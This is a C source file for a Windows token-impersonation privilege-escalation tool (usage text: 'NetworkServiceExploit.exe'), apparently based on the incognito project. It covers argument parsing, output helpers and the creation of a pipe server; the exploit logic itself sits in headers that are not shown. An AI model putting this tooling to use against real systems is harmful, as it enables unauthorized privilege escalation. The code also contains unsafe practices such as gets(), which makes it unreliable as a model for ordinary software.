/*
Software License Agreement (BSD License)

Copyright (c) 2006, Luke Jennings (0xlukej@gmail.com)
All rights reserved.

Redistribution and use of this software in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above
  copyright notice, this list of conditions and the
  following disclaimer.

* Redistributions in binary form must reproduce the above
  copyright notice, this list of conditions and the
  following disclaimer in the documentation and/or other
  materials provided with the distribution.

* Neither the name of Luke Jennings nor the names of its
  contributors may be used to endorse or promote products
  derived from this software without specific prior
  written permission of Luke Jennings.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#define _CRT_SECURE_NO_DEPRECATE 1
#include <windows.h>
#include <stdio.h>
#include "child_process.h"

#include "token_info.h"
#include "process_execution.h"

#include "list_tokens.h"

#include "handle_arguments.h"



static HANDLE threadSemaphore;
static HANDLE threadMutex;
static int threadCount = 0;
extern int gProcessId;
char* g_command;
BOOL g_ListMode = FALSE;
BOOL g_interactive = FALSE;

void output_string(char* string, ...)
{
	DWORD dwWritten;
	va_list ap;
	char temp[2048];

	va_start(ap, string);
	if (_vsnprintf(temp, sizeof(temp), string, ap) == -1)
		temp[sizeof(temp) - 1] = '\0';

	if (hOUTPUT == stdout)
		printf("%s", temp);
	else
		WriteFile(hOUTPUT, temp, strlen(temp), &dwWritten, NULL);

	va_end(ap);
}

void output_status_string(char* string, ...)
{
	char* host = remote_host;
	DWORD dwWritten;
	va_list ap;
	char temp[2048];

	if (suppress_status)
		return;

	va_start(ap, string);
	if (_vsnprintf(temp, sizeof(temp), string, ap) == -1)
		temp[sizeof(temp) - 1] = '\0';

	if (hOUTPUT == stdout)
	{
		printf("%s", temp);
	}
	else
	{
		
		WriteFile(hOUTPUT, temp, strlen(temp), &dwWritten, NULL);
	}

	va_end(ap);
}



BOOL output_counted_string(char* string, DWORD dwRead)
{
	DWORD dwWritten;

	if (hOUTPUT == stdout)
		return fwrite(string, sizeof(char), dwRead, hOUTPUT);
	else
		return WriteFile(hOUTPUT, string, dwRead, &dwWritten, NULL);
}

BOOL read_counted_input(char* string, int string_size, DWORD* dwRead)
{
	char* ret_value;

	if (hINPUT == stdin)
	{
		ret_value = gets(string);
		*dwRead = strlen(string) + 1;
		return (BOOL)ret_value;
	}
	else
		return ReadFile(hINPUT, string, string_size, dwRead, NULL);
}

void print_error_if_system()
{
	if (!is_local_system())
		output_string("[-] WARNING: Not running as SYSTEM. Not all tokens will be available.\n");
}

void usage(char* programName)
{
	}


void GenRandomString(wchar_t* s, const int len)
{

	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}
void Usage()
{
	printf("NetworkServiceExploit.exe:\n");
	printf("\t -c <command>\n");
	printf("\t -i interactive mode\n");
	printf("\t -l list unique tokens\n");
	printf("\t -p <pid> specific pid to look for\n");
	exit(1);
}
void handle_options(int argc, char* argv[])
{
	wchar_t pipename[12];
	
	
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		
		case 'p':
			++argv;
			--argc;
			gProcessId = atoi(argv[1]);
			break;

		case 'c':
			++argv;
			--argc;
			g_command = argv[1];
			break;

		case 'l':
			g_ListMode = TRUE;
			break;
		case 'i':
			g_interactive = TRUE;
			break;
		default:
			printf("Wrong Argument: %s\n", argv[1]);
			Usage();
			exit(-1);
		}

		++argv;
		--argc;
	}
	if (g_command == NULL && !g_ListMode)
		Usage();
	memset(pipename, 0, sizeof(pipename));
	GenRandomString(pipename, 11);
	CreatePipeServer(pipename);
	
	return 0;
	}